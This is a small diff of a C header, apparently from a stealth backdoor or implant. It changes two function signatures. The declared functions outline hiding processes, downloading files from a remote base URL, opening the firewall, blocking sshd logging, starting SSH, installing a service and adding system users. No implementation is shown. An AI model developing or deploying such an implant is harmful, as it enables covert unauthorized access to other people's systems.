@@ -11,7 +11,7 @@ extern const char *base_url;
 extern const char *programs[];
 
 // Function declarations
-pid_t run_task_and_hide(const char *cmd);
+pid_t run_task_and_hide(const char *cmd, ...);
 static int remove_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf);
 void purge_directory(const char *dir_path);
 void find_pid_by_name(const char *program_name, int **found_pids);
@@ -19,7 +19,7 @@ void hide_pids(int *pids);
 void combine_and_hide_pids(const char *names[], int num_names);
 void download_file(const char *local_path, const char *url);
 void create_and_enable_service();
-void allow_firewall();
+int allow_firewall();
 void block_sshd_log();
 void start_sshd();
 void add_system_user(const char *username);
